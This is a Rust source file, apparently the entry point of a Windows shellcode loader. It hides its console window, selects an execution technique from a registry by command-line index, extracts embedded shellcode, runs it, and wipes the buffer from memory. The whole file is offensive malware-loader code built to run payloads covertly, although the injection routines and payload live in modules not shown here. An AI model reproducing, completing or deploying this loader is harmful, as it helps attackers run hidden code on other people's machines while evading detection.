#![windows_subsystem = "windows"]

mod config;
mod shellcode;
mod payload;
mod ntapi;
mod techniques;

use std::process;

fn main() {
    let mut tech_idx: usize = config::DEFAULT_TECHNIQUE;
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut i = 0;
    while i < args.len() {
        if args[i] == "-t" && i + 1 < args.len() {
            if let Ok(v) = args[i + 1].parse::<usize>() {
                tech_idx = v;
            }
            i += 1;
        }
        i += 1;
    }

    if tech_idx >= techniques::REGISTRY.len() {
        process::exit(1);
    }

    let mut sc = payload::extract_shellcode();
    if sc.is_empty() {
        process::exit(1);
    }

    let ok = (techniques::REGISTRY[tech_idx].func)(&sc);
    payload::wipe(&mut sc);

    if !ok {
        process::exit(1);
    }
}
